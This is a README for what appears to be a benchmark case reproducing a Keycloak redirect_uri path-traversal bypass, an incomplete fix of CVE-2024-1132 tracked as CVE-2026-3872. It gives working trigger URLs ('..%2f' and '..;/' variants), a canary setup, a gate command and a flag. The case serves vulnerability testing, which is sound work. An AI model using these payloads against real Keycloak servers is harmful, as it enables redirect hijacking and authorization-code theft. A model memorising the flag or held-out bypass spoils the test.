# keycloak-cve-2026-3872

Keycloak — CVE-2024-1132 -> CVE-2026-3872 (the `UNSAFE_PATH_PATTERN` guard
introduced in 24.0.3 treats `/`, `%2f`, `%5c`, `\` as the delimiter that may
follow `..` but omits the `;` matrix-parameter separator, so `..;/` slips past
redirect_uri wildcard validation; Path_Traversal; case.json records root_cause
`Path_Traversal`, no CWE ID). **Genuine incomplete fix; gate passed on real Docker
over EXTERNAL HTTP.**

V1 不完整修复的源码级分析见同目录 [INCOMPLETE_FIX_ANALYSIS.md](INCOMPLETE_FIX_ANALYSIS.md)。

Real official Keycloak (Quarkus) images (`quay.io/keycloak/keycloak:24.0.2` /
`24.0.3` / `26.5.7`, `start-dev --import-realm`); realm `pcb` imports client `poc`
registered with the wildcard redirect `http://127.0.0.1:40052/allowed/*` — the
`/allowed/` base the guard is meant to confine redirects to. The canary is an
attacker-controlled `hashicorp/http-echo` sidecar (`:40052`, every path returns
`${PCB_FLAG}`); Keycloak never fetches it — the following client (`curl -L`)
lands there ONLY when the crafted `redirect_uri` passes
`org.keycloak.protocol.oidc.utils.RedirectUtils` validation and Keycloak 302s
the `prompt=none` authorization flow. A blocked payload yields Keycloak's
`Invalid parameter: redirect_uri` page — no redirect, no flag.

Sink evolution (source-confirmed per tag, repro.log): 24.0.2 has NO
`UNSAFE_PATH_PATTERN` (decode + `URI.normalize` then wildcard match); 24.0.3
introduces the pattern WITHOUT `;`; 26.5.7 (PR #47788 / commit `35a71b0`) adds
`|;` to the delimiter group. case.json `evidence.incomplete_fix_quote`: "allows
an attacker, who controls another path on the same web server, to bypass the
allowed path in redirect URIs that use a wildcard ... It is the incomplete-fix
residual of CVE-2024-1132, whose UNSAFE_PATH_PATTERN caught encoded `..` traversal
but not the `..;/` matrix-parameter variant."

- **V0 = 24.0.2** (`quay.io/keycloak/keycloak:24.0.2`, `:40080`) — decoded +
  normalized path still matches `/allowed/*` -> encoded-`..%2f` seed 302s to the
  sidecar -> flag (repro.log: CANARY-HIT).
- **V1 = 24.0.3** (`quay.io/keycloak/keycloak:24.0.3`, `:40081`, target) — the
  1132 fix BLOCKS the encoded seed (raw-path pattern match -> HTTP 400), but
  `redirect_uri = http://127.0.0.1:40052/allowed/..;/pwn` is not matched by the
  pattern (`;` missing) -> wildcard still applies -> 302 -> sidecar -> flag.
  Incomplete fix.
- **V2 = 26.5.7** (`quay.io/keycloak/keycloak:26.5.7`, `:40082`, 3872 fix) —
  both payloads HTTP 400; valid `/allowed/ok` control still 302s (repro.log).

- **Original trigger**: `GET /realms/pcb/protocol/openid-connect/auth?client_id=poc&response_type=code&scope=openid&prompt=none&redirect_uri=http://127.0.0.1:40052/allowed/x/..%2fpwn`
  (encoded dot-dot; `poc/original_poc.py` `REDIRECT_URI`).
- **Residual trigger**: same endpoint with
  `redirect_uri=http://127.0.0.1:40052/allowed/..;/pwn` (matrix-parameter
  traversal; `_heldout/bypass_poc.py` `REDIRECT_URI`).

Run: `python3 oracle.py --run-gate --with-v2`. See `repro.log` and `case.json`
(gate 2026-07-10, flag `PCBFLAG_7a0ba0f002410eb4382d92f0e3fd500f`: v0 seed
CANARY-HIT / v1 seed 400 / v1 residual CANARY-HIT / v2 residual 400; passed=true;
valid-redirect chain-health control on all versions).
